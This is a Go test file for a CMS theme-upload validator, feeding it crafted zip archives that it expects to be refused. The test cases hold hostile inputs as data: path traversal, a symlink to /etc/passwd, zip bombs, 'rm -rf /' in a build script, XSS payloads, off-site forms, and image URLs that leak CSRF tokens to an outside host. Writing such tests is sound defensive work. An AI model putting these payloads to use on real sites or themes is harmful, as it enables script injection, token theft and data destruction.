package web

import (
	"archive/zip"
	"bytes"
	"context"
	"errors"
	"io"
	"io/fs"
	"log/slog"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"sap13ns/internal/config"
	"sap13ns/internal/media"
	"sap13ns/internal/theme"
	"sap13ns/ui"
)

// tinyTheme is a small valid theme: marker shows on its pages.
func tinyTheme(marker string) map[string]string {
	return map[string]string{
		"theme.json": `{"name": "Tiny", "version": "1.0.0", "description": "A test theme.",
  "menus": [{"id": "primary", "label": "Main menu"}],
  "widget_areas": [{"id": "footer", "label": "Footer"}],
  "options": [{"key": "accent", "label": "Accent", "type": "select", "default": "blue",
    "choices": [{"value": "blue", "label": "Blue"}, {"value": "green", "label": "Green"}]}],
  "tokens": {"light": {"primary": "#1d4ed8"}, "dark": {"primary": "#60a5fa"},
    "options": {"accent": {"green": {"light": {"primary": "#15803d"}}}}},
  "swatches": ["#ffffff", "#1d4ed8"]}`,
		"templates/layout.html": `{{define "layout"}}<!doctype html>
<html lang="{{.Site.Lang}}">
<head>{{template "shared/head" .}}</head>
<body class="kind-{{.Kind}}">
{{template "shared/skip-link"}}
{{template "shared/admin-bar" .}}
<header><a href="{{link "/"}}">{{.Site.Title}}</a>
<nav aria-label="{{T "Main menu"}}"><ul id="menu">{{template "shared/menu" (.Site.Menu "primary")}}</ul></nav>
{{template "shared/theme-toggle"}}{{template "shared/nav-toggle" "menu"}}
<form method="get" action="{{link "/search"}}"><input name="q"></form>
</header>
<main id="main" tabindex="-1">{{template "content" .}}</main>
{{if .BlocksFooter}}{{template "shared/blocks-footer" .}}{{else}}
<footer>{{template "shared/widget-area" (dict "Page" . "Area" "footer")}}{{template "shared/footer-meta" .}}</footer>
{{end}}
{{template "shared/assistant" .}}
</body>
</html>{{end}}`,
		"templates/home.html": `{{define "content"}}<p class="marker">` + marker + `</p>
{{range $i, $p := .Posts}}{{template "tiny/card" $p}}{{else}}{{template "shared/no-results" .}}{{end}}
{{template "shared/pagination" .Pagination}}{{end}}`,
		"templates/single.html": `{{define "content"}}<p class="marker">` + marker + `</p>
{{with .Post}}<article><h1>{{.Title}}</h1>{{template "shared/post-meta" .}}{{template "shared/content" .}}</article>{{end}}
{{template "shared/comments" .}}{{end}}`,
		"templates/partials/bits.html": `{{define "tiny/card"}}<article><h2><a href="{{.URL}}">{{.Title}}</a></h2>{{range .Categories}}<a href="{{.URL}}">{{.Name}}</a>{{end}}</article>{{end}}`,
		"static/theme.css":             `body{margin:0}.footer-meta{opacity:.8}@font-face{font-family:T;src:url(fonts/t.woff2)}`,
		"i18n/es.json":                 `{"Main menu": "Menú principal", "%d posts": "%d entradas"}`,
		"README.md":                    "# Tiny\n",
		"src/theme.css":                `@import "tailwindcss";`,
	}
}

type zipEntry struct {
	name string
	data []byte
	mode fs.FileMode // 0 for a regular file
	raw  bool        // stored, not deflated
}

// zipOf packs files (name -> content; "" removes) over base into folder
// prefix ("" for the root of the archive).
func zipOf(t *testing.T, prefix string, base, files map[string]string, extra ...zipEntry) []byte {
	t.Helper()
	all := map[string]string{}
	for k, v := range base {
		all[k] = v
	}
	for k, v := range files {
		if v == "" {
			delete(all, k)
		} else {
			all[k] = v
		}
	}
	var entries []zipEntry
	for _, k := range slices.Sorted(mapsKeys(all)) {
		entries = append(entries, zipEntry{name: path.Join(prefix, k), data: []byte(all[k])})
	}
	return zipEntries(t, append(entries, extra...)...)
}

func mapsKeys(m map[string]string) func(func(string) bool) {
	return func(yield func(string) bool) {
		for k := range m {
			if !yield(k) {
				return
			}
		}
	}
}

func zipEntries(t *testing.T, entries ...zipEntry) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, e := range entries {
		h := &zip.FileHeader{Name: e.name, Method: zip.Deflate}
		if e.raw {
			h.Method = zip.Store
		}
		if e.mode != 0 {
			h.SetMode(e.mode)
		}
		w, err := zw.CreateHeader(h)
		if err != nil {
			t.Fatal(err)
		}
		w.Write(e.data)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// zipDir packs a theme folder of fsys into folder prefix.
func zipDir(t *testing.T, fsys fs.FS, dir, prefix string) []byte {
	t.Helper()
	files := map[string]string{}
	err := fs.WalkDir(fsys, dir, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		b, err := fs.ReadFile(fsys, p)
		files[strings.TrimPrefix(p, dir+"/")] = string(b)
		return err
	})
	if err != nil {
		t.Fatal(err)
	}
	return zipOf(t, prefix, files, nil)
}

// themeTestManager is a site's theme manager with an empty themes
// directory and a network directory holding the theme "netty".
func themeTestManager(t *testing.T) (*theme.Manager, string) {
	t.Helper()
	base, _ := url.Parse("http://example.com")
	dir, network := t.TempDir(), t.TempDir()
	for name, content := range tinyTheme("network") {
		p := filepath.Join(network, "netty", filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o640); err != nil {
			t.Fatal(err)
		}
	}
	cfg := &config.Config{BaseURL: base, DataDir: t.TempDir(), ThemesDir: dir, NetworkThemesDir: network}
	m, err := ThemeManager(cfg, ui.FS, slog.New(slog.NewTextHandler(io.Discard, nil)))
	if err != nil {
		t.Fatal(err)
	}
	return m, dir
}

func install(m *theme.Manager, pkg []byte, q theme.Quota) (*theme.InstallResult, error) {
	return m.Install(context.Background(), bytes.NewReader(pkg), int64(len(pkg)), theme.InstallOptions{Source: "upload", Quota: q})
}

// The built-in themes, and the corporate site's, pass the validation of
// uploads under another name: the rules fit real themes.
func TestThemeUploadBuiltinsValidate(t *testing.T) {
	m, dir := themeTestManager(t)
	roots := map[string]fs.FS{"ui/themes": mustSub(t, ui.FS, "themes"), "site/themes": os.DirFS("../../site/themes")}
	for label, fsys := range roots {
		entries, err := fs.ReadDir(fsys, ".")
		if err != nil {
			t.Fatal(err)
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			slug := "copy-" + e.Name()
			res, err := install(m, zipDir(t, fsys, e.Name(), slug), nil)
			if ref, ok := theme.IsRefusal(err); ok {
				for _, p := range ref.Problems {
					t.Errorf("%s/%s: %s", label, e.Name(), p.Error())
				}
				continue
			}
			if err != nil {
				t.Fatalf("%s/%s: %v", label, e.Name(), err)
			}
			if res.Slug != slug || res.Replaced {
				t.Errorf("%+v", res)
			}
			if _, err := os.Stat(filepath.Join(dir, slug, "theme.json")); err != nil {
				t.Error(err)
			}
			if th, ok := m.Get(slug); !ok || !th.Uploaded || !th.Own || th.Upload.SHA256 != res.SHA256 {
				t.Errorf("%s not loaded as an upload: %+v", slug, th)
			}
		}
	}
}

func mustSub(t *testing.T, fsys fs.FS, dir string) fs.FS {
	t.Helper()
	sub, err := fs.Sub(fsys, dir)
	if err != nil {
		t.Fatal(err)
	}
	return sub
}

// layoutWith is tiny's layout with old replaced by new.
func layoutWith(old, new string) map[string]string {
	l := tinyTheme("x")["templates/layout.html"]
	if !strings.Contains(l, old) {
		panic("layoutWith: " + old)
	}
	return map[string]string{"templates/layout.html": strings.Replace(l, old, new, 1)}
}

func homeWith(body string) map[string]string {
	return map[string]string{"templates/home.html": `{{define "content"}}` + body + `{{end}}`}
}

const footer = `{{template "shared/footer-meta" .}}`

// TestThemeValidation: one crafted archive per rule, each refused with
// its problem, nothing left in the themes directory; then a valid theme.
func TestThemeValidation(t *testing.T) {
	m, dir := themeTestManager(t)
	base := tinyTheme("x")
	pngHead := []byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR")
	laughs := map[string]string{"templates/partials/laughs.html": func() string {
		var b strings.Builder
		b.WriteString(`{{define "l0"}}{{if false}}{{end}}{{end}}`)
		for i := 1; i <= 8; i++ {
			b.WriteString(`{{define "l` + string(rune('0'+i)) + `"}}`)
			for range 10 {
				b.WriteString(`{{template "l` + string(rune('0'+i-1)) + `" .}}`)
			}
			b.WriteString(`{{end}}`)
		}
		return b.String()
	}()}
	for k, v := range homeWith(`{{template "l8" .}}`) {
		laughs[k] = v
	}
	// Each level calls the one below in both branches: 2^28 template calls
	// if the HTML checks inlined them all.
	branches := map[string]string{"templates/partials/branches.html": func() string {
		var b strings.Builder
		b.WriteString(`{{define "b0"}}{{end}}`)
		for i := 1; i <= 28; i++ {
			below := `{{template "b` + strconv.Itoa(i-1) + `" .}}`
			b.WriteString(`{{define "b` + strconv.Itoa(i) + `"}}{{if .}}` + below + `{{else}}` + below + `{{end}}{{end}}`)
		}
		return b.String()
	}()}
	for k, v := range homeWith(`{{template "b28" .}}`) {
		branches[k] = v
	}

	cases := []struct {
		name string
		pkg  []byte
		want string
	}{
		{"not a zip", []byte("PK\x03\x04 not really"), "archive.invalid"},
		{"no theme.json", zipOf(t, "tiny", base, map[string]string{"theme.json": ""}), "archive.no-manifest"},
		{"traversal", zipOf(t, "tiny", base, nil, zipEntry{name: "tiny/../evil.css", data: []byte("x")}), "archive.unsafe-path"},
		{"absolute", zipOf(t, "tiny", base, nil, zipEntry{name: "/etc/evil.css", data: []byte("x")}), "archive.unsafe-path"},
		{"symlink", zipOf(t, "tiny", base, nil, zipEntry{name: "tiny/static/x.css", data: []byte("/etc/passwd"), mode: fs.ModeSymlink | 0o777}), "archive.link"},
		{"hidden", zipOf(t, "tiny", base, map[string]string{".htaccess": "x"}), "archive.hidden"},
		{"bomb", zipOf(t, "tiny", base, nil, zipEntry{name: "tiny/static/big.png", data: append(pngHead, make([]byte, 3<<20)...)}), "archive.bomb"},
		{"large template", zipOf(t, "tiny", base, map[string]string{"templates/page.html": strings.Repeat("x", 300<<10)}), "archive.file-too-large"},
		{"stored over the limit", zipOf(t, "tiny", base, nil, zipEntry{name: "tiny/static/big.png", data: append(pngHead, make([]byte, 5<<20)...), raw: true}), "archive.file-too-large"},
		{"javascript", zipOf(t, "tiny", base, map[string]string{"static/app.js": "alert(1)"}), "static.script"},
		{"module", zipOf(t, "tiny", base, map[string]string{"static/app.mjs": "export {}"}), "static.script"},
		{"wasm", zipOf(t, "tiny", base, map[string]string{"static/x.wasm": "\x00asm"}), "static.script"},
		{"html page", zipOf(t, "tiny", base, map[string]string{"static/page.html": "<p>hi</p>"}), "static.script"},
		{"html at the root", zipOf(t, "tiny", base, map[string]string{"index.html": "<p>hi</p>"}), "static.script"},
		{"script sniffed in css", zipOf(t, "tiny", base, map[string]string{"static/theme.css": "<script>alert(1)</script>"}), "static.script"},
		{"html sniffed in a png", zipOf(t, "tiny", base, map[string]string{"static/logo.png": "<html><script>alert(1)</script>"}), "static.script"},
		{"text in a png", zipOf(t, "tiny", base, map[string]string{"static/logo.png": "just text"}), "static.mismatch"},
		{"svg", zipOf(t, "tiny", base, map[string]string{"static/logo.svg": `<svg xmlns="http://www.w3.org/2000/svg"/>`}), "static.svg"},
		{"other type", zipOf(t, "tiny", base, map[string]string{"static/data.json": "{}"}), "static.type"},
		{"css import", zipOf(t, "tiny", base, map[string]string{"static/theme.css": `@import url(https://example.com/x.css);`}), "static.css"},
		{"css external url", zipOf(t, "tiny", base, map[string]string{"static/theme.css": `body{background:url(https://example.com/x.png)}`}), "static.css"},
		{"css javascript url", zipOf(t, "tiny", base, map[string]string{"static/extra.css": `a{background:url(javascript:alert(1))}`}), "static.css"},
		{"src not css", zipOf(t, "tiny", base, map[string]string{"src/build.sh": "rm -rf /"}), "src.type"},
		{"stray file", zipOf(t, "tiny", base, map[string]string{"notes.txt": "x"}), "layout.not-allowed"},
		{"template outside partials", zipOf(t, "tiny", base, map[string]string{"templates/extra.html": "x"}), "layout.template-name"},
		{"missing single", zipOf(t, "tiny", base, map[string]string{"templates/single.html": ""}), "layout.missing"},
		{"missing stylesheet", zipOf(t, "tiny", base, map[string]string{"static/theme.css": ""}), "layout.missing"},
		{"bad theme.json", zipOf(t, "tiny", base, map[string]string{"theme.json": `{"name": 5}`}), "manifest.json"},
		{"option type", zipOf(t, "tiny", base, map[string]string{"theme.json": `{"name": "T", "options": [{"key": "a", "label": "A", "type": "file"}]}`}), "manifest.option-type"},
		{"colour token", zipOf(t, "tiny", base, map[string]string{"theme.json": `{"name": "T", "tokens": {"light": {"glow": "#ffffff"}}}`}), "manifest.token"},
		{"colour", zipOf(t, "tiny", base, map[string]string{"theme.json": `{"name": "T", "swatches": ["red"]}`}), "manifest.colour"},
		{"slug of a built-in", zipOf(t, "apple", base, nil), "manifest.builtin"},
		{"slug of a network theme", zipOf(t, "netty", base, nil), "manifest.network"},
		{"slug mismatch", zipOf(t, "tiny", base, map[string]string{"theme.json": `{"name": "T", "slug": "other"}`}), "manifest.slug-mismatch"},
		{"no slug", zipOf(t, "", base, nil), "manifest.no-slug"},
		{"bad slug", zipOf(t, "Tiny_Theme", base, nil), "manifest.slug"},
		{"language code", zipOf(t, "tiny", base, map[string]string{"i18n/EN_us.json": "{}"}), "i18n.lang"},
		{"translation format", zipOf(t, "tiny", base, map[string]string{"i18n/es.json": `{"%d posts": "%999999d entradas"}`}), "format.width"},
		{"no credit", zipOf(t, "tiny", base, layoutWith(footer, "")), "template.credit"},
		{"credit on one branch", zipOf(t, "tiny", base, layoutWith(footer, `{{if .Site.Viewer}}`+footer+`{{end}}`)), "template.credit"},
		{"credit in a loop", zipOf(t, "tiny", base, layoutWith(footer, `{{range .Posts}}{{template "shared/footer-meta" $}}{{end}}`)), "template.credit"},
		{"credit in the title", zipOf(t, "tiny", base, layoutWith(`<head>`, `<head><title>`+footer+`</title>`)), "template.credit-context"},
		{"credit in a comment", zipOf(t, "tiny", base, layoutWith(footer, `<!-- `+footer+` -->`)), "template.credit-context"},
		{"credit in an attribute", zipOf(t, "tiny", base, layoutWith(footer, `<p title='`+footer+`'></p>`)), "template.credit-context"},
		{"credit breaking an attribute", zipOf(t, "tiny", base, layoutWith(footer, `<p title="`+footer+`"></p>`)), "template.escape"},
		{"credit with other data", zipOf(t, "tiny", base, layoutWith(footer, `{{template "shared/footer-meta" (dict "Site" .Site)}}`)), "template.credit-data"},
		{"unknown function", zipOf(t, "tiny", base, homeWith(`{{nosuch 1}}`)), "template.func"},
		{"admin function", zipOf(t, "tiny", base, homeWith(`{{inputTime nil}}`)), "template.func-denied"},
		{"seq", zipOf(t, "tiny", base, homeWith(`{{range seq 1000000}}x{{end}}`)), "template.func-denied"},
		{"toJSON", zipOf(t, "tiny", base, homeWith(`{{toJSON .Title}}`)), "template.func-denied"},
		{"call", zipOf(t, "tiny", base, homeWith(`{{call .Title}}`)), "template.func-denied"},
		{"range over an int field", zipOf(t, "tiny", base, homeWith(`{{range .Total}}x{{end}}`)), "template.range"},
		{"range over a literal", zipOf(t, "tiny", base, homeWith(`{{range 1000000}}x{{end}}`)), "template.range"},
		{"range over arithmetic", zipOf(t, "tiny", base, homeWith(`{{range mul 1000 1000}}x{{end}}`)), "template.range"},
		{"range over a list", zipOf(t, "tiny", base, homeWith(`{{range list 1 2 3}}x{{end}}`)), "template.range"},
		{"range over a reassigned variable", zipOf(t, "tiny", base, homeWith(`{{$p := .Posts}}{{$p = list 1 2}}{{range $p}}x{{end}}`)), "template.range"},
		{"range in a shared template", zipOf(t, "tiny", base, homeWith(`{{template "shared/menu" (list 1 2 3)}}`)), "template.range-shared"},
		{"range in a shared template via dict", zipOf(t, "tiny", base, homeWith(`{{template "shared/post-list" (dict "Posts" 1000000 "Layout" "list")}}`)), "template.range-shared"},
		{"recursion", zipOf(t, "tiny", base, map[string]string{
			"templates/partials/loop.html": `{{define "tiny/loop"}}x{{template "tiny/loop" .}}{{end}}`,
			"templates/home.html":          `{{define "content"}}{{template "tiny/loop" .}}{{end}}`}), "template.recursion"},
		{"mutual recursion", zipOf(t, "tiny", base, map[string]string{
			"templates/partials/loop.html": `{{define "tiny/a"}}a{{template "tiny/b" .}}{{end}}{{define "tiny/b"}}b{{template "tiny/a" .}}{{end}}`,
			"templates/home.html":          `{{define "content"}}{{template "tiny/a" .}}{{end}}`}), "template.recursion"},
		{"recursion through a shared template", zipOf(t, "tiny", base, map[string]string{
			"templates/partials/c.html": `{{define "shared/comment"}}{{template "shared/comments" $}}{{end}}`}), "template.recursion"},
		{"a shared template redefined", zipOf(t, "tiny", base, map[string]string{
			"templates/partials/c.html": `{{define "shared/no-results"}}<p>{{T "Nothing here."}}</p>{{end}}`}), ""},
		{"nested silent loops", zipOf(t, "tiny", base, homeWith(`{{range .Posts}}{{range .Categories}}{{end}}{{end}}`)), "template.silent-loops"},
		{"costly silent loop", zipOf(t, "tiny", base, homeWith(`{{range .Posts}}{{if contains .Content "x"}}{{end}}{{end}}`)), "template.silent-cost"},
		{"exponential expansion", zipOf(t, "tiny", base, laughs), "template.too-big"},
		{"exponential branches", zipOf(t, "tiny", base, branches), "template.too-big"},
		{"missing template", zipOf(t, "tiny", base, homeWith(`{{template "nope" .}}`)), "template.missing"},
		{"field typo", zipOf(t, "tiny", base, homeWith(`{{.Site.Titel}}`)), "template.field"},
		{"parse error", zipOf(t, "tiny", base, homeWith(`{{if}}`)), "template.parse"},
		{"not utf-8", zipOf(t, "tiny", base, homeWith("\xff\xfe")), "template.encoding"},
		{"inline script", zipOf(t, "tiny", base, homeWith(`<script>alert(1)</script>`)), "template.script"},
		{"script in svg", zipOf(t, "tiny", base, homeWith(`<svg><script>alert(1)</script></svg>`)), "template.script"},
		{"script made by an action", zipOf(t, "tiny", base, homeWith(`<{{"script"}}>alert(1)</script>`)), "template.tag-name"},
		{"attribute named by an action", zipOf(t, "tiny", base, homeWith(`<form action="/x" {{"method"}}="post"><button>x</button></form>`)), "template.attr-name"},
		{"attribute named by a template", zipOf(t, "tiny", base, map[string]string{
			"templates/partials/m.html": `{{define "tiny/m"}}method{{end}}`,
			"templates/home.html":       `{{define "content"}}<form action="/x" {{template "tiny/m"}}="post"></form>{{end}}`}), "template.attr-name"},
		{"script split by branches", zipOf(t, "tiny", base, homeWith(`<scr{{if true}}{{end}}ipt>alert(1)</script>`)), "template.script"},
		{"event handler", zipOf(t, "tiny", base, homeWith(`<img src="/x.png" onerror="alert(1)" alt="">`)), "template.handler"},
		{"handler split across templates", zipOf(t, "tiny", base, map[string]string{
			"templates/partials/rest.html": `{{define "tiny/rest"}}nclick="alert(1)"{{end}}`,
			"templates/home.html":          `{{define "content"}}<p o{{template "tiny/rest"}}>x</p>{{end}}`}), "template.attr-name"},
		{"script split across templates", zipOf(t, "tiny", base, map[string]string{
			"templates/partials/rest.html": `{{define "tiny/rest"}}ipt>alert(1)</script{{end}}`,
			"templates/home.html":          `{{define "content"}}<scr{{template "tiny/rest"}}>{{end}}`}), "template.script"},
		{"style attribute", zipOf(t, "tiny", base, homeWith(`<p style="color:red">x</p>`)), "template.style"},
		{"style element", zipOf(t, "tiny", base, homeWith(`<style>p{color:red}</style>`)), "template.style"},
		{"meta refresh", zipOf(t, "tiny", base, homeWith(`<meta http-equiv="refresh" content="0;url=https://example.com">`)), "template.http-equiv"},
		{"iframe", zipOf(t, "tiny", base, homeWith(`<iframe src="https://example.com"></iframe>`)), "template.element"},
		{"base", zipOf(t, "tiny", base, homeWith(`<base href="/admin/">`)), "template.element"},
		{"post form", zipOf(t, "tiny", base, homeWith(`<form method="post" action="/admin/settings"><button>Go</button></form>`)), "template.form-post"},
		{"form attribute", zipOf(t, "tiny", base, homeWith(`<button form="x" formaction="/admin/settings">Go</button>`)), "template.form-attr"},
		{"protected template", zipOf(t, "tiny", base, map[string]string{"templates/partials/head.html": `{{define "shared/head"}}<title>x</title>{{end}}`}), "template.protected"},
		{"credit redefined", zipOf(t, "tiny", base, map[string]string{"templates/partials/f.html": `{{define "shared/footer-meta"}}<p>none</p>{{end}}`}), "template.protected"},
		{"escaped name", zipOf(t, "tiny", base, map[string]string{"templates/partials/f.html": `{{define "tiny/x$htmltemplate_stateRCDATA"}}x{{end}}`}), "template.name"},
		{"csrf token", zipOf(t, "tiny", base, homeWith(`<img src="https://example.com/?t={{with .Site.Viewer}}{{.CSRF}}{{end}}" alt="">`)), "template.secret"},
		{"whole viewer", zipOf(t, "tiny", base, homeWith(`{{.Site.Viewer}}`)), "template.secret-print"},
		{"whole site", zipOf(t, "tiny", base, homeWith(`{{printf "%v" .Site}}`)), "template.secret-print"},
		{"viewer through a shared template", zipOf(t, "tiny", base, homeWith(`{{template "shared/nav-toggle" .Site}}`)), "template.secret-print"},
		{"admin bar in an attribute", zipOf(t, "tiny", base, homeWith(`<img alt='{{template "shared/admin-bar" .}}' src="/x.png">`)), "template.context"},
		{"assistant", zipOf(t, "tiny", base, homeWith(`{{with .Site.Assistant}}x{{end}}`)), "template.member-denied"},
		{"format width", zipOf(t, "tiny", base, homeWith(`{{printf "%999999d" 1}}`)), "format.width"},
		{"format from data", zipOf(t, "tiny", base, homeWith(`{{printf .Title 1}}`)), "template.format-literal"},
		{"translation format from data", zipOf(t, "tiny", base, homeWith(`{{T .Title 1}}`)), "template.format-literal"},
		{"plural width", zipOf(t, "tiny", base, homeWith(`{{plural .Total "%*d post" "%d posts"}}`)), "format.width"},
		// The probe runs every page within the bounds of RenderContext.
		{"probe doubling a text", zipOf(t, "tiny", base, homeWith(`{{$a := printf "%s%s" "abcdefgh" "abcdefgh"}}`+
			strings.Repeat(`{{$a = printf "%s%s" $a $a}}`, 40)+`{{len $a}}`)), "template.render-limit"},
		{"probe repeating an argument", zipOf(t, "tiny", base, homeWith(`{{$a := printf "%99s" "x"}}`+
			strings.Repeat(`{{$a = printf "%[1]s%[1]s%[1]s%[1]s" $a}}`, 20)+`{{len $a}}`)), "template.render-limit"},
		{"probe making too much text", zipOf(t, "tiny", base, homeWith(`{{$a := printf "%99s" "x"}}`+
			strings.Repeat(`{{$a = printf "%[1]s%[1]s%[1]s%[1]s" $a}}`, 6)+strings.Repeat(`{{$b := upper $a}}`, 300))), "template.render-limit"},
		{"lists holding themselves print short", zipOf(t, "tiny", base, homeWith(`{{$l := list 1}}`+
			strings.Repeat(`{{$l = list $l $l}}`, 64)+`<p>{{$l}}</p>`)), ""},
		// Forms.
		{"form around the comments", zipOf(t, "tiny", base, homeWith(`<form action="/search">{{template "shared/comments" .}}</form>`)), "template.form-nested"},
		{"form around the admin bar", zipOf(t, "tiny", base, layoutWith(`{{template "shared/admin-bar" .}}`, `<form action="/search">{{template "shared/admin-bar" .}}</form>`)), "template.form-nested"},
		{"form in a partial around the comments", zipOf(t, "tiny", base, map[string]string{
			"templates/partials/f.html": `{{define "tiny/open"}}<form action="/search">{{end}}`,
			"templates/home.html":       `{{define "content"}}{{template "tiny/open"}}{{template "shared/comments" .}}</form>{{end}}`}), "template.form-nested"},
		{"select around the comments", zipOf(t, "tiny", base, homeWith(`<select name="s">{{template "shared/comments" .}}</select>`)), "template.form-nested"},
		{"form closed inside a select", zipOf(t, "tiny", base, homeWith(`<form action="/search"><select name="s"></form></select>{{template "shared/comments" .}}`)), "template.form-nested"},
		{"comments after a closed form", zipOf(t, "tiny", base, homeWith(`<form action="/search"><input name="q"></form>{{template "shared/comments" .}}`)), ""},
		{"off-site form", zipOf(t, "tiny", base, homeWith(`<form action="https://example.com/collect"><button>Go</button></form>`)), "template.form-action"},
		{"protocol-relative form", zipOf(t, "tiny", base, homeWith(`<form action="//example.com/collect"><button>Go</button></form>`)), "template.form-action"},
		{"form escaped off-site", zipOf(t, "tiny", base, homeWith(`<form action="/&#47;example.com/collect"><button>Go</button></form>`)), "template.form-action"},
		{"form off-site through a tab", zipOf(t, "tiny", base, homeWith("<form action=\"/\t/example.com/collect\"><button>Go</button></form>")), "template.form-action"},
		{"form action from the data", zipOf(t, "tiny", base, homeWith(`<form action="{{.Canonical}}"><button>Go</button></form>`)), "template.form-action"},
		{"form action after a slash", zipOf(t, "tiny", base, homeWith(`<form action="/{{.Title}}"><button>Go</button></form>`)), "template.form-action"},
		{"form action of a link to another site", zipOf(t, "tiny", base, homeWith(`<form action="{{link "//example.com"}}"><button>Go</button></form>`)), "template.form-action"},
		{"form to a path of the site", zipOf(t, "tiny", base, homeWith(`<form action="/search"><button>Go</button></form><form action="{{link "/search"}}?x=1"></form>`)), ""},
		// The referrer.
		{"referrerpolicy", zipOf(t, "tiny", base, homeWith(`<a href="https://example.com/" referrerpolicy="unsafe-url">x</a>`)), "template.referrer"},
		{"meta referrer", zipOf(t, "tiny", base, homeWith(`<meta name="referrer" content="unsafe-url">`)), "template.referrer"},
		{"noscript", zipOf(t, "tiny", base, homeWith(`<noscript><meta name="Referrer" content="unsafe-url"></noscript>`)), "template.element"},
		{"noscript hiding a form", zipOf(t, "tiny", base, homeWith(`<noscript><a title="</noscript><form action=//evil.example>">x</a></noscript>`)), "template.element"},
		{"meta named by an action", zipOf(t, "tiny", base, homeWith(`<meta name="{{.Title}}" content="unsafe-url">`)), "template.meta-name"},
		{"rel opener", zipOf(t, "tiny", base, homeWith(`<a href="https://example.com/" target="_blank" rel="noreferrer opener">x</a>`)), "template.rel"},
		{"rel from an action", zipOf(t, "tiny", base, homeWith(`<a href="https://example.com/" rel="{{.Title}}">x</a>`)), "template.rel"},
		// Foreign content, which the checks' tokenizer does not read as a
		// browser does.
		{"svg title", zipOf(t, "tiny", base, homeWith(`<svg><title><form method="post" action="/x"></form></title></svg>`)), "template.svg"},
		{"svg foreignObject", zipOf(t, "tiny", base, homeWith(`<svg><foreignObject><div></div></foreignObject></svg>`)), "template.svg"},
		{"svg leaving through an end tag", zipOf(t, "tiny", base, homeWith(`<svg></p><path d="M0 0"/></svg>`)), "template.svg"},
		{"shared template in svg", zipOf(t, "tiny", base, homeWith(`<svg>{{template "shared/theme-toggle"}}</svg>`)), "template.svg"},
		{"math", zipOf(t, "tiny", base, homeWith(`<math><mi>x</mi></math>`)), "template.element"},
		{"inline svg drawing", zipOf(t, "tiny", base, homeWith(`<svg viewBox="0 0 24 24" aria-hidden="true"><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>`+
			`<g><path d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="4"/><text x="1" y="2">{{.Title}}</text></g></svg>`)), ""},
		// Tokens.
		{"comment token", zipOf(t, "tiny", base, homeWith(`{{with .CommentForm}}<img src="https://example.com/?t={{.Token}}" alt="">{{end}}`)), "template.secret"},
		{"token placeholder", zipOf(t, "tiny", base, homeWith(`<img src="https://example.com/?t=sap-ctoken-1" alt="">`)), "template.token"},
		{"token placeholder in an action", zipOf(t, "tiny", base, homeWith(`<img src="https://example.com/?t={{printf "sap-ftoken-%s" "x.y"}}" alt="">`)), "template.token"},
		{"token placeholder in a translation", zipOf(t, "tiny", base, map[string]string{"i18n/es.json": `{"Main menu": "sap-ctoken-1"}`}), "template.token"},
		{"plugin form placeholder", zipOf(t, "tiny", base, homeWith(`<form action="/search"><div data-form="contact.form"></div></form>`)), "template.token"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			start := time.Now()
			res, err := install(m, c.pkg, nil)
			// The probe stops a page that blows up within its bounds.
			if took := time.Since(start); took > theme.RenderTimeout {
				t.Errorf("the checks took %s", took)
			}
			if c.want == "" {
				if err != nil {
					t.Fatalf("refused: %v", err)
				}
				if _, err := m.Remove(context.Background(), res.Slug, "", nil); err != nil {
					t.Fatal(err)
				}
				return
			}
			ref, ok := theme.IsRefusal(err)
			if !ok {
				t.Fatalf("got %v, want a refusal with %s", err, c.want)
			}
			var codes []string
			for _, p := range ref.Problems {
				codes = append(codes, p.Code)
				if theme.Messages[p.Code] == "" || strings.Contains(p.Error(), "%!") {
					t.Errorf("bad message for %s: %q", p.Code, p.Error())
				}
			}
			if !slices.Contains(codes, c.want) {
				t.Fatalf("got %v, want %s: %v", codes, c.want, err)
			}
		})
	}
	// Nothing of the refused archives stayed.
	if ents, err := os.ReadDir(dir); err != nil || len(ents) != 0 {
		t.Fatalf("left in the themes directory: %v %v", ents, err)
	}

	// A valid theme, in a folder or at the root with its slug in
	// theme.json.
	res, err := install(m, zipOf(t, "tiny", base, nil), nil)
	if err != nil {
		t.Fatal(err)
	}
	if res.Slug != "tiny" || res.Name != "Tiny" || res.Version != "1.0.0" || res.Replaced || res.Bytes <= 0 || len(res.SHA256) != 64 {
		t.Fatalf("%+v", res)
	}
	root := map[string]string{"theme.json": `{"name": "Rooted", "slug": "rooted"}`}
	if res, err := install(m, zipOf(t, "", base, root), nil); err != nil || res.Slug != "rooted" {
		t.Fatalf("%+v %v", res, err)
	}
	if th, ok := m.Get("tiny"); !ok || !th.Uploaded || func() string { v, _ := th.Text("es", "Main menu"); return v }() != "Menú principal" {
		t.Fatalf("tiny: %+v", th)
	}
	// The refusal lists every problem it found, up to the cap.
	many := map[string]string{}
	for i := range 80 {
		many["static/f"+string(rune('a'+i%26))+string(rune('a'+i/26))+".js"] = "x"
	}
	_, err = install(m, zipOf(t, "tiny", base, many), nil)
	if ref, ok := theme.IsRefusal(err); !ok || len(ref.Problems) != theme.MaxProblems {
		t.Fatalf("got %v", err)
	}
}

// english switches the site, and its admin, to English, for the tests
// that read the admin's messages.
func (e *pluginEnv) english() {
	e.t.Helper()
	ctx := context.Background()
	set, err := e.st.LoadSettings(ctx)
	if err == nil {
		set.Language = "en"
		err = e.st.SaveSettings(ctx, set)
	}
	if err == nil {
		err = e.s.ReloadSettings(ctx)
	}
	if err != nil {
		e.t.Fatal(err)
	}
}

func (e *pluginEnv) uploadTheme(name string, pkg []byte) *httptest.ResponseRecorder {
	e.t.Helper()
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	mw.WriteField("csrf", e.csrf)
	fw, _ := mw.CreateFormFile("theme", name)
	fw.Write(pkg)
	mw.Close()
